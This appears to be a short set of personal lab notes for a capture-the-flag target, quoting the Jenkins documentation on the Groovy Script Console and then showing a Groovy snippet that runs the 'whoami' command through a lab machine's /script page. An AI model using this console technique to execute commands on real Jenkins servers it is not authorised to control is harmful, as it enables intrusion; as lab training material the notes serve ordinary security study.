https://www.jenkins.io/doc/book/managing/script-console/
```
Jenkins features a Groovy script console which allows one to run arbitrary Groovy scripts within the Jenkins controller runtime or in the runtime on agents.

|   |   |
|---|---|
||It is _very_ **important** to understand all of the following points because it affects the integrity of your Jenkins installation. The Jenkins Script Console:<br><br>- Access is controlled by the `Administer` permission.<br>    <br>- Is a web-based Groovy shell into the Jenkins runtime. Groovy is a very powerful language which offers the ability to do practically anything Java can do including:<br>    <br>    - Create sub-processes and execute arbitrary commands on the Jenkins controller and agents.<br>        <br>    - It can even read files in which the Jenkins controller has access to on the host (like `/etc/passwd`)|

<SNIP>

### Running Script Console on the controller[](https://www.jenkins.io/doc/book/managing/script-console/#running-script-console-on-the-controller)

This feature can be accessed from _"Manage Jenkins" > "Script Console"_.  Or by visiting the sub-URL `/script` on your Jenkins controller.
```


# Code execution
http://10.129.85.169:8080/script

```
def command = "whoami"
def process = command.execute()
def output = process.text
println output
```

![[PennyworthCodeExecution.png]]
